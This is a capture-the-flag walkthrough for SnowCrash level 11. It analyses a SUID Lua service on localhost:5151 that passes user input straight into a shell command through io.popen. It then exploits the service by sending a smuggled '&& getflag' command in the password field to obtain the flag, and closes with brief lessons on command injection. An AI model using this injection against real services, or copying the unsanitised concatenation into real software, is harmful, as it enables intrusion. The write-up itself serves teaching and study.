# SnowCrash Level11 Walkthrough

## Challenge Description

Exploit a command injection vulnerability in a Lua script that improperly sanitizes user input for a password hashing function.

## Initial Analysis

```bash
level11@SnowCrash:~$ ls -all
total 16
dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
-r-x------  1 level11 level11  675 Apr  3  2012 .profile
```

## Files

- `level11.lua`: SUID script (runs as flag11)
- Listening on: `localhost:5151`

## Understanding the Vulnerability

### 1. Port Identification

When executing the script:

```bash
level11@SnowCrash:~$ ./level11.lua
lua: ./level11.lua:3: address already in use
stack traceback:
        [C]: in function 'assert'
        ./level11.lua:3: in main chunk
        [C]: ?
```

```bash
cat level11.lua
# we can see : local server = assert(socket.bind("127.0.0.1", 5151))
```

### 2. Connect to the Service

```bash
nc localhost 5151
Password: test
Erf nope..
```

### 3. Code Analysis

```bash
level11@SnowCrash:~$ cat level11.lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

The dangerous function:

```bash
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")  # Vulnerable concatenation
  -- ...hash processing...
end
```

1. The script takes password input via client:receive()
2. Input is directly inserted into a shell command:

```bash
echo [OUR_INPUT] | sha1sum
```

### 4. Step-by-Step Exploit

1. Prepare injection:

```bash
nc localhost 5151
Password: && getflag > /tmp/flag11
```

- The && terminates the echo command
- Output redirects to /tmp/flag11

2. Verify execution:

```bash
cat /tmp/flag11
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

## Security Lessons

- Command Injection: Never concatenate user input into shell commands
- Input Sanitization: Use allow-lists or proper escaping

## Next Steps

With the flag fa6v5ateaw21peobuub8ipe6s, we can now proceed to Level12 of the SnowCrash challenge.
